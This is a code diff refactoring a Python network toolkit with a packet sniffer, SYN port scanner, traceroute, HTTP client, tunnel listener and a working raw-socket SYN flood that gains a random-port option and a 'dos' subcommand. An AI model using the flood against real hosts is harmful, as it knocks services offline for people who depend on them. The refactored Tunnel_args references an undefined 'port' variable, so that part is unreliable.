@@ -17,17 +17,27 @@ class Constant :
     ISROOT : bool = os.geteuid() == 0
     TIME : int = round(time.time())
     ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
+    IFACES : list = [iface[-1] for iface in socket.if_nameindex()]
     COUNTER : int = ctypes.c_uint32
     SUP_COLOR : bool = True if (os.getenv("COLORTERM") in ("truecolor", "24bit", "color24")) and (os.getenv("NOCOLOR") in (None, 0, "false", "no")) else False
     SLASH : str = chr(47)
     ESCAPE : str = chr(27)
     TOOLS : dict = dict()
     FILES : list = list()
-    INFO : str = f"""\n
-        [System] : [{sys.platform.upper()}, {time.ctime()}]
-        [Hostname] : [{socket.gethostname()}, PID {os.getpid()}]
-        [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]
-        [GitHub] : [github.com/HI6Cypher]\n\n"""
+    INFO : tuple = (
+        f"[System] : [{sys.platform.upper()}, {time.ctime()}]",
+        f"[Hostname] : [{socket.gethostname()}, PID {os.getpid()}]",
+        f"[Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]",
+        f"[GitHub] : [github.com/HI6Cypher]"
+        )
+
+    def SOURCE() -> str :
+        try : host = socket.gethostbyname("_gateway")
+        except : host = "192.168.0.0"
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock :
+            sock.connect((host, 0))
+            source = sock.getsockname()[0]
+        return source
 
     def EXIT(code : int) -> None :
         sys.exit(code)
@@ -101,9 +111,9 @@ class Sniff :
         self.tmp = tmp
         self.saddr = saddr
         self.daddr = daddr
+        self.sock_recvbuf = recvbuf
         self.__counter = Constant.COUNTER(0)
         self.bufstack = Stack(list())
-        self.sock_recvbuf = recvbuf
         self.tmp_file = None
 
     def __repr__(self) -> str :
@@ -558,7 +568,7 @@ class Sniff :
                 return parsed_headers
 
     async def check_interface(self) -> None :
-        ifaces = [iface[-1] for iface in socket.if_nameindex()]
+        ifaces = Constant.IFACES
         if (self.iface not in ifaces) :
             raise OSError(f"{self.iface} not in {ifaces}")
         self.iface = self.iface.encode()
@@ -644,11 +654,11 @@ class Sniff :
 
 
 class Scan :
-    def __init__(self, source : str, host : str, timeout : int, event_loop : "async_event_loop") -> "Scan_class" :
-        self.source = source
+    def __init__(self, host : str, timeout : float, event_loop : "async_event_loop") -> "Scan_class" :
         self.host = host
         self.timeout = timeout
         self.loop = event_loop
+        self.source = Constant.SOURCE()
         self.ipv4_static_header = self.ipv4_header()
         self.opens = list()
         self.unspecified = list()
@@ -751,12 +761,12 @@ class Scan :
 
 
 class Trace :
-    def __init__(self, source : str, host : str, efforts : int, timeout : int, max_error : int) -> "Trace_class" :
-        self.source = source
-        self._host = self.host = host
+    def __init__(self, host : str, efforts : int, timeout : float, max_error : int) -> "Trace_class" :
+        self.host = host
         self._efforts = self.efforts = efforts
         self.timeout = timeout
         self.max_frequent_errors = max_error
+        self.source = Constant.SOURCE()
         self.last_hop_ipaddr = (str(), int())
         self.current_ttl = Constant.COUNTER(1)
         self._port = self.port = Constant.COUNTER(33434)
@@ -772,15 +782,6 @@ class Trace :
 
     def __str__(self) -> str :
         return f"Sniff : \n\t{self.host}"
-
-    @property
-    def host(self) -> str :
-        return self._host
-
-    @host.setter
-    def host(self, host) -> None :
-        self._host = socket.gethostbyname(host)
-        return None
 
     @property
     def efforts(self) -> int :
@@ -997,10 +998,12 @@ class Trace :
 
 
 class DoS_SYN :
-    def __init__(self, host: str, port : int, rate : int) -> "DoS_SYN_class" :
+    def __init__(self, host : str, port : int, count : int, rand_port : bool) -> "DoS_SYN_class" :
         self.host = host
-        self.port = int(port)
-        self.rate = rate
+        self._port = self.port = port
+        self.count = count
+        self.rand_port = rand_port
+        self.source = Constant.SOURCE()
         self.__counter = Constant.COUNTER(0)
 
     def __repr__(self) -> str :
@@ -1011,11 +1014,20 @@ class DoS_SYN :
         return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"
 
     @property
-    def count(self) -> int :
+    def port(self) -> int :
+        return self._port if not self.rand_port else random.randint(0, 65535)
+
+    @port.setter
+    def port(self, value : int) -> None :
+        self._port = value
+        return
+
+    @property
+    def counter(self) -> int :
         return self.__counter.value
 
-    @count.setter
-    def count(self, value : int) -> None :
+    @counter.setter
+    def counter(self, value : int) -> None :
         self.__counter.value = value
         return
 
@@ -1079,7 +1091,7 @@ class DoS_SYN :
     def package(self) -> bytes :
         randip = self.random_ip()
         randnum = lambda x, y : random.randint(x, y)
-        src = socket.inet_pton(socket.AF_INET, "192.168.129.207")
+        src = socket.inet_pton(socket.AF_INET, self.source)
         dst = socket.inet_pton(socket.AF_INET, self.host)
         randidn = randnum(0, 65535)
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
@@ -1087,11 +1099,12 @@ class DoS_SYN :
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
         randseq = randnum(0, 65535)
         randsrp = randnum(1024, 65535)
-        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1)
+        port = self.port
+        tcp_header = self.tcp_header(src_p = randsrp, dst_p = port, seq = randseq, syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
+        tcp_header = self.tcp_header(src_p = randsrp, dst_p = port, seq = randseq, syn = 1, csm = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
@@ -1100,15 +1113,15 @@ class DoS_SYN :
         return
 
     def __flood(self) -> None :
-        while (self.count != self.rate) :
+        while (self.counter != self.count) :
             payload = self.package()
             with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                 flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 flood.connect((self.host, self.port))
                 flood.sendto(payload, (self.host, self.port))
                 flood.shutdown(socket.SHUT_RDWR)
-            self.count += 1
-            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.count, self.rate)}" + " " + f"[{self.count}/{self.rate}]"
+            self.counter += 1
+            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.counter, self.count)}" + " " + f"[{self.counter}/{self.count}]"
             print(text, end = "\r", flush = True)
         else :
             end_time = round((time.time() - Constant.TIME), 2)
@@ -1136,6 +1149,24 @@ class HTTP_Request :
     def __str__(self) -> str :
         return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"
 
+    def prepare(self) -> str :
+        if self.header : return self.header
+        payload = [
+            f"{self.method} {self.end} HTTP/1.1",
+            f"Host: {self.host}",
+            "User-Agent: HI6ToolKit",
+            "Accept: */*",
+            "Connection: close",
+            "\r\n"
+            ]
+        return "\r\n".join(payload)
+
+    def parse_response_header(self, response : bytes) -> tuple[str, bytes] :
+        response = response.split(b"\r\n\r\n", 1)
+        self.response_header = response[0].decode()
+        self.response = response[1]
+        return self.response_header, self.response
+
     def request(self) -> None :
         self.__request()
         return
@@ -1145,29 +1176,18 @@ class HTTP_Request :
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
             http.settimeout(30)
             http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
-            payload = [
-                f"{self.method} {self.end} HTTP/1.1",
-                f"Host: {self.host}",
-                "User-Agent: HI6ToolKit",
-                "Accept: */*",
-                "Connection: close",
-                "\r\n"
-                ] if not self.header else self.header
-            payload = "\r\n".join(payload) if not self.header else payload
-            self.request_header = payload
-            if not Constant.MODULE : print(payload)
+            self.request_header = self.prepare()
+            if not Constant.MODULE : print(self.request_header)
             http.connect((self.host, self.port))
-            http.send(payload.encode())
+            http.send(self.request_header.encode())
             raw_data = bytes()
             while True :
                 response = http.recv(1024)
                 if not response :
-                    raw_data = raw_data.split(b"\r\n\r\n", 1)
-                    self.response_header = raw_data[0].decode()
-                    self.response = raw_data[-1]
+                    header, data = self.parse_response_header(raw_data)
                     if not Constant.MODULE :
-                        print(self.response_header, end = "\n\n")
-                        if (self.method == "GET") : print(self.response)
+                        print(header, end = "\n\n")
+                        print(data)
                     if self.https : http.close()
                     break
                 else :
@@ -1176,7 +1196,7 @@ class HTTP_Request :
 
 
 class Tunnel :
-    def __init__(self, host : str, port : int, timeout : int, buffer : int) -> "Tunnel_class" :
+    def __init__(self, host : str, port : int, timeout : float, buffer : int) -> "Tunnel_class" :
         self.host = host
         self.port = port
         self.timeout = timeout
@@ -1360,120 +1380,77 @@ if not Constant.MODULE :
         parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
         subparser = parser.add_subparsers(title = "tools")
         info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
+        info_tool.add_argument("-m", "--msg", type = str, help = "appends message to info", default = "HI6ToolKit")
         info_tool.set_defaults(func = info_args)
-        sniff_tool = subparser.add_parser("sniff", help = "execute Sniff class")
-        sniff_tool.add_argument("-if", "--iface", type = str, help = "sniffs on specific interface")
-        sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr", default = None)
-        sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr", default = None)
-        sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "tmps sniffed packets in file", default = False)
-        sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.SO_RCVBUF size", default = 128 * 1024)
+        sniff_tool = subparser.add_parser("sniff", help = "execute packet sniffer")
+        sniff_tool.add_argument("-if", "--iface", type = str, required = True, help = "sniffs on specific interface", metavar = Constant.IFACES)
+        sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr")
+        sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr")
+        sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "enables storing sniffed packets in file", default = False)
+        sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.SO_RCVBUF size", metavar = "socket.SO_RCVBUF", default = 128 * 1024)
         sniff_tool.set_defaults(func = Sniff_args)
         scan_tool = subparser.add_parser("scan", help = "execute SYN port scanner")
-        scan_tool.add_argument("-s", "--source", type = str, help = "sets source addr for scanning")
-        scan_tool.add_argument("-x", "--host", type = str, help = "sets host addr for scanning")
-        scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning", default = "0-65535")
-        scan_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout for unanswered syn segments", default = 5)
+        scan_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host addr for scanning")
+        scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning with format X-Y", metavar = "X-Y", default = "0-65535")
+        scan_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered syn segments", default = 5.0)
         scan_tool.set_defaults(func = Scan_args)
-        trace_tool = subparser.add_parser("trace", help = "execute Trace class")
-        trace_tool.add_argument("-s", "--source", type = str, help = "sets source addr for tracing", default = None)
-        trace_tool.add_argument("-x", "--host", type = str, help = "sets hsot addr for tracing", default = None)
-        trace_tool.add_argument("-e", "--efforts", type = int, help = "sets number of efforts for each hop", default = 2)
-        trace_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout for unanswered udp segments", default = 1)
-        trace_tool.add_argument("-m", "--max-error", type = int, help = "sets maximum number of unanswered udp segments", default = 20)
+        trace_tool = subparser.add_parser("trace", help = "execute traceroute")
+        trace_tool.add_argument("-x", "--host", type = str, required = True, help = "sets hsot addr for tracing")
+        trace_tool.add_argument("-e", "--efforts", type = int, help = "sets number of efforts for each hop", default = 3)
+        trace_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered udp segments", default = 1.0)
+        trace_tool.add_argument("-m", "--max-error", type = int, help = "sets maximum number of unanswered udp segments", default = 10)
         trace_tool.set_defaults(func = Trace_args)
-        dos_tool = subparser.add_parser("dos", help = "execute DoS_SYN class")
-        dos_tool.add_argument("-x", "--host", type = str, help = "sets host for flooding")
-        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding")
-        dos_tool.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
+        dos_tool = subparser.add_parser("dos", help = "execute SYN flood DoS")
+        dos_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for flooding")
+        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
+        dos_tool.add_argument("-c", "--count", type = int, required = True, help = "sets number of packets")
+        dos_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
         dos_tool.set_defaults(func = DoS_SYN_args)
-        http_tool = subparser.add_parser("http", help = "execute HTTP_Request class")
-        http_tool.add_argument("-x", "--host", type = str, help = "sets host for http request")
+        http_tool = subparser.add_parser("http", help = "execute http request")
+        http_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for http request")
         http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
-        http_tool.add_argument("-m", "--method", type = str, help = "sets request type(GET or HEAD)", default = "GET")
+        http_tool.add_argument("-m", "--method", type = str, help = "sets request type", metavar = ["GET", "HEAD"], default = "GET")
         http_tool.add_argument("-c", "--custom", type = str, help = "sets custome header for HTTP_Request", default = str())
         http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
-        http_tool.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)", default = False)
+        http_tool.add_argument("-s", "--secure", action = "store_true", help = "enables secure socket(ssl)", default = False)
         http_tool.set_defaults(func = HTTP_Request_args)
-        tunnel_tool = subparser.add_parser("tunnel", help = "execute Tunnel class")
+        tunnel_tool = subparser.add_parser("tunnel", help = "execute http tunnel listener")
         tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
         tunnel_tool.add_argument("-p", "--port", type = int, help = "sets port", default = "80")
-        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)", default = 2048)
-        tunnel_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout", default = 60)
+        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets socket.recv buffer", default = 2048)
+        tunnel_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout", default = 60.0)
         tunnel_tool.set_defaults(func = Tunnel_args)
         args = parser.parse_args()
         return args
 
-    def invalid_args(arg : str) -> None :
-        msg = "[" + Constant.RED("ERROR") + "]" + " "
-        msg += Constant.RED(f"Invalid argument : \"{arg}\"") + "\n"
-        msg += "[" + Constant.RED("ERROR") + "]" + " "
-        msg += Constant.RED("Type : \"python hi6toolkit.py [--help | -h]\"")
-        print(msg, file = sys.stderr)
-        Constant.EXIT(1)
+    def info_args(args : argparse.Namespace) -> None :
+        info = f"\t[{args.msg}]\n\t"
+        info += "\n\t".join(Constant.INFO)
+        info += "\n"
+        print(Constant.RED(info.expandtabs(4)))
         return
 
-    def root_access_error() -> None :
-        msg = "[" + Constant.RED("ERROR") + "]" + " "
-        msg += Constant.RED("ROOT ACCESS ERROR") + "\n"
-        print(msg)
-        Constant.EXIT(1)
-        return
-
-    def check(**kwargs : dict) -> tuple[bool, None | list] :
-        nones = list()
-        for k, v in kwargs.items() :
-            if not v : nones.append(k)
-        return (True, None) if not nones else (False, nones)
-
-    def info_args() -> None :
-        print(Constant.YELLOW(Constant.INFO))
-        return
-
-    def ensure() -> None :
-        if not Constant.MODULE :
-            print(Constant.YELLOW(Constant.INFO))
-            input("\nPress ENTER to continue...\n")
-        return
-
-    def Sniff_args() -> None :
-        global args
-        args = {
-            "iface" : args.iface,
-            "filter_saddr" : args.saddr,
-            "filter_daddr" : args.daddr,
-            "tmp" : args.tmp,
-            "buffer" : args.buffer
-            }
-        success, nones = check(iface = args["iface"])
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
-        iface = args["iface"]
-        filter_saddr = args["filter_saddr"]
-        filter_daddr = args["filter_daddr"]
-        tmp = args["tmp"]
-        buffer = args["buffer"]
+    def Sniff_args(args : argparse.Namespace) -> None :
+        args.msg = "Sniff"
         if not Constant.ISROOT : root_access_error()
-        ensure()
-        sniff = Sniff(asyncio.get_event_loop(), iface, tmp, filter_saddr, filter_daddr, buffer)
+        trigger(args)
+        sniff = Sniff(
+            asyncio.get_event_loop(),
+            args.iface,
+            args.tmp,
+            args.saddr,
+            args.daddr,
+            args.buffer
+            )
         asyncio.run(sniff.sniff())
         return
 
-    def Scan_args() -> None :
-        global args
-        args = {
-            "source" : args.source,
-            "host" : args.host,
-            "port_range" : args.port_range,
-            "timeout" : args.timeout
-            }
-        success, nones = check(source = args["source"], host = args["host"])
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
+    def Scan_args(args : argparse.Namespace) -> None :
+        args.msg = "Scan"
         split_port_range : tuple = lambda x : tuple([int(i) for i in x.split("-")])
-        source = socket.gethostbyname(args["source"])
-        host = socket.gethostbyname(args["host"])
-        port_range = split_port_range(args["port_range"])
-        timeout = args["timeout"]
+        port_range = split_port_range(args.port_range)
         if not Constant.ISROOT : root_access_error()
-        ensure()
+        trigger(args)
 
         async def wait_to_empty(n : int, buffer : set | list) -> None :
             while (len(buffer) >= n) :
@@ -1486,7 +1463,11 @@ if not Constant.MODULE :
             print("[" + Constant.GREEN("START") + "]", end = " ")
             print("set async event loop")
             loop = asyncio.get_event_loop()
-            scan = Scan(source, host, timeout, loop)
+            scan = Scan(
+                socket.gethostbyname(args.host),
+                args.timeout,
+                loop
+                )
             buffer = set()
             for port in range(port_range[0], port_range[1] + 1) :
                 if (len(buffer) >= 100) :
@@ -1511,100 +1492,91 @@ if not Constant.MODULE :
         asyncio.run(prepare())
         return
 
-    def Trace_args() -> None :
-        global args
-        args = {
-            "source" : args.source,
-            "host" : args.host,
-            "efforts" : args.efforts,
-            "timeout" : args.timeout,
-            "max_error" : args.max_error
-            }
-        success, nones = check(source = args["source"], host = args["host"])
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
-        source = args["source"]
-        host = args["host"]
-        efforts = args["efforts"]
-        timeout = args["timeout"]
-        max_error = args["max_error"]
+    def Trace_args(args : argparse.Namespace) -> None :
+        args.msg = "Trace"
         if not Constant.ISROOT : root_access_error()
-        ensure()
-        trace = Trace(source, host, efforts, timeout, max_error)
+        trigger(args)
+        trace = Trace(
+            socket.gethostbyname(args.host),
+            args.efforts,
+            args.timeout,
+            args.max_error
+            )
         trace.trace()
         return
 
-    def DoS_SYN_args() -> None :
-        global args
-        args = {
-            "host" : args.host,
-            "port" : args.port,
-            "rate" : args.rate
-            }
-        success, nones = check(**args)
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
-        host = socket.gethostbyname(args["host"])
-        port = args["port"]
-        rate = args["rate"]
+    def DoS_SYN_args(args : argparse.Namespace) -> None :
+        args.msg = "DoS_SYN"
         if not Constant.ISROOT : root_access_error()
-        ensure()
-        flood = DoS_SYN(host, port, rate)
+        trigger(args)
+        flood = DoS_SYN(
+            socket.gethostbyname(args.host),
+            args.port,
+            args.count,
+            args.random_port
+            )
         flood.flood()
         return
 
-    def HTTP_Request_args() -> None :
-        global args
-        args = {
-            "host" : args.host,
-            "port" : args.port,
-            "method" : args.method,
-            "header" : args.custom,
-            "endpoint" : args.endpoint,
-            "secure" : args.secure
-            }
-        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
-        host = args["host"]
-        port = args["port"]
-        method = args["method"].upper()
-        header = args["header"].replace("_", "\r\n")
-        path = args["endpoint"]
-        secure = args["secure"]
-        ensure()
-        client = HTTP_Request(host, port, method, header, path, secure)
+    def HTTP_Request_args(args : argparse.Namespace) -> None :
+        args.msg = "HTTP"
+        trigger(args)
+        client = HTTP_Request(
+            args.host,
+            args.port,
+            args.method,
+            args.custom,
+            args.endpoint,
+            args.secure
+            )
         client.request()
         return
 
-    def Tunnel_args() -> None :
-        global args
-        args = {
-            "host" :  args.host,
-            "port" : args.port,
-            "timeout" :  args.timeout,
-            "buffer" : args.buffer
-            }
-        success, nones = check(**args)
-        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
-        host = args["host"]
-        port = args["port"]
-        timeout = args["timeout"]
-        buffer = args["buffer"]
+    def Tunnel_args(args : argparse.Namespace) -> None :
+        args.msg = "Tunnel"
         if (not Constant.ISROOT) and (port <= 1024) : root_access_error()
-        ensure()
-        tunnel = Tunnel(host, port, timeout, buffer)
+        trigger(args)
+        tunnel = Tunnel(
+            args.host,
+            args.port,
+            args.timeout,
+            args.buffer
+            )
         tunnel.tunnel()
         return
 
+    def invalid_args(arg : str) -> None :
+        msg = "[" + Constant.RED("ERROR") + "]" + " "
+        msg += Constant.RED(f"Invalid argument : \"{arg}\"") + "\n"
+        msg += "[" + Constant.RED("ERROR") + "]" + " "
+        msg += Constant.RED("Type : \"python hi6toolkit.py [--help | -h]\"")
+        print(msg, file = sys.stderr)
+        Constant.EXIT(1)
+        return
+
+    def root_access_error() -> None :
+        msg = "[" + Constant.RED("ERROR") + "]" + " "
+        msg += Constant.RED("ROOT ACCESS ERROR") + "\n"
+        print(msg)
+        Constant.EXIT(1)
+        return
+
+    def trigger(msg : str) -> None :
+        if not Constant.MODULE :
+            info_args(msg)
+            input("\nPress ENTER to continue...\n")
+        return
+
     def main() -> bool :
-        global args
         print(Constant.ESCAPE + "c")
         signal.signal(signal.SIGINT, Constant.SIGNAL)
         signal.signal(signal.SIGTERM, Constant.SIGNAL)
         if not Constant.ISOS :
-            print("unsupported OS")
+            print(Constant.RED("unsupported OS"))
             Constant.EXIT(1)
         args = manage_args()
         if ("func" in vars(args)) :
-            args.func()
+            args.func(args)
         else :
             invalid_args("argument NOT found")
         return True
